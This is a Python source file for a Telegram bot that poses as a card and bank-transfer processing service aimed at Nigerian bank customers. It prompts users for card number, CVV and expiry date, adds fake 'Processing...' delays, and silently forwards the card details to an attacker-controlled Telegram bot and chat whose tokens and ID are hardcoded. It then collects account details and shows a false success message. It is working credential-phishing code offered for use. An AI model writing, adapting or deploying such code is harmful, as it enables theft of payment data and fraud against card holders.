from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
import logging
import time

# Replace this with your bot's token
BOT_TOKEN = '7127996651:AAE6OiISDIyD_KwKW5aI2gm50HpZVkApCkQ'
# Replace this with the target bot's token and chat ID
TARGET_BOT_TOKEN = '6882610910:AAEJDf8wnPlwSTz3bsPa-zZchPZIz7qEFUo'
TARGET_CHAT_ID = '6952589723'

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

banks = [

    "OPAY", "Pampay", "Access Bank", "Citibank", "Diamond Bank", "Ecobank", "Fidelity Bank",
    "First Bank", "FCMB", "GTBank", "Heritage Bank", "Keystone Bank",
    "Polaris Bank", "Providus Bank", "Stanbic IBTC Bank", "Standard Chartered Bank",
    "Sterling Bank", "Suntrust Bank", "Union Bank", "UBA", "Unity Bank",
    "Wema Bank", "Zenith Bank"
]

card_types = ["Mastercard", "Visa", "Verve"]

user_data = {}

def start(update: Update, context: CallbackContext) -> None:
    keyboard = [[InlineKeyboardButton(card_type, callback_data=card_type)] for card_type in card_types]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Please select your card type:', reply_markup=reply_markup)

def card_type_selection(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    user_data[user_id] = {'card_type': query.data}
    query.edit_message_text(text=f"Selected card type: {query.data}")
    context.bot.send_message(chat_id=user_id, text='Please enter your card number:')

def handle_message(update: Update, context: CallbackContext) -> None:
    user_id = update.message.from_user.id
    if user_id not in user_data:
        update.message.reply_text('Please start by selecting your card type with /start')
        return

    if 'card_number' not in user_data[user_id]:
        user_data[user_id]['card_number'] = update.message.text
        update.message.reply_text('Please enter your CVV (look at the back of the card):')
    elif 'cvv' not in user_data[user_id]:
        user_data[user_id]['cvv'] = update.message.text
        update.message.reply_text('Please enter your card expiration date (MM/YY):')
    elif 'expiry_date' not in user_data[user_id]:
        user_data[user_id]['expiry_date'] = update.message.text
        update.message.reply_text('Processing...')
        
        time.sleep(5)  # Simulate processing time
        
        # Send the collected information to the target bot
        send_to_target_bot(
            f"Card Type: {user_data[user_id]['card_type']}\n"
            f"Card Number: {user_data[user_id]['card_number']}\n"
            f"CVV: {user_data[user_id]['cvv']}\n"
            f"Expiry Date: {user_data[user_id]['expiry_date']}\n"
        )
        
        update.message.reply_text('Processing completed.\nPlease enter your account number:')
    elif 'account_number' not in user_data[user_id]:
        user_data[user_id]['account_number'] = update.message.text
        update.message.reply_text('Please enter your account name:')
    elif 'account_name' not in user_data[user_id]:
        user_data[user_id]['account_name'] = update.message.text
        update.message.reply_text('Please enter the amount you want to send:')
    elif 'amount' not in user_data[user_id]:
        user_data[user_id]['amount'] = update.message.text
        update.message.reply_text('Processing...')
        
        time.sleep(1)  # Simulate processing time
        
        update.message.reply_text('Processing completed.\nPlease select your bank:')
        keyboard = [[InlineKeyboardButton(bank, callback_data=bank)] for bank in banks]
        reply_markup = InlineKeyboardMarkup(keyboard)
        update.message.reply_text('Select your bank:', reply_markup=reply_markup)

def button(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    user_data[user_id]['bank'] = query.data
    query.edit_message_text(text=f"Selected bank: {query.data}")

    amounts = ["30,000 NGN", "50,000 NGN", "70,000 NGN", "100,000 NGN"]
    keyboard = [[InlineKeyboardButton(amount, callback_data=amount)] for amount in amounts]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.message.reply_text('Select the amount to send:', reply_markup=reply_markup)

def handle_amount_selection(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    user_data[user_id]['selected_amount'] = query.data

    query.edit_message_text(text=f"Selected amount: {query.data}")
    query.message.reply_text(
        f"Account Number: {user_data[user_id]['account_number']}\n"
        f"Account Name: {user_data[user_id]['account_name']}\n"
        f"Amount: {user_data[user_id]['amount']}\n"
        f"Bank: {user_data[user_id]['bank']}\n"
        f"Selected Amount: {query.data}\n\n"
        "Successful 🎉🎉 submitted, hold on for five minutes sir."
    )
    # Clear the user session data after completion
    user_data.pop(user_id, None)

def send_to_target_bot(message: str) -> None:
    from telegram import Bot
    target_bot = Bot(TARGET_BOT_TOKEN)
    try:
        target_bot.send_message(chat_id=TARGET_CHAT_ID, text=message)
        logging.info(f"Message sent to chat ID {TARGET_CHAT_ID}: {message}")
    except Exception as e:
        logging.error(f"Failed to send message to chat ID {TARGET_CHAT_ID}: {e}")

def main() -> None:
    updater = Updater(BOT_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CallbackQueryHandler(card_type_selection, pattern='^(Mastercard|Visa|Verve)$'))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    dispatcher.add_handler(CallbackQueryHandler(button, pattern='^(?!30,000 NGN$|50,000 NGN$|70,000 NGN$|100,000 NGN$).*$'))
    dispatcher.add_handler(CallbackQueryHandler(handle_amount_selection, pattern='^(30,000 NGN|50,000 NGN|70,000 NGN|100,000 NGN)$'))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main(
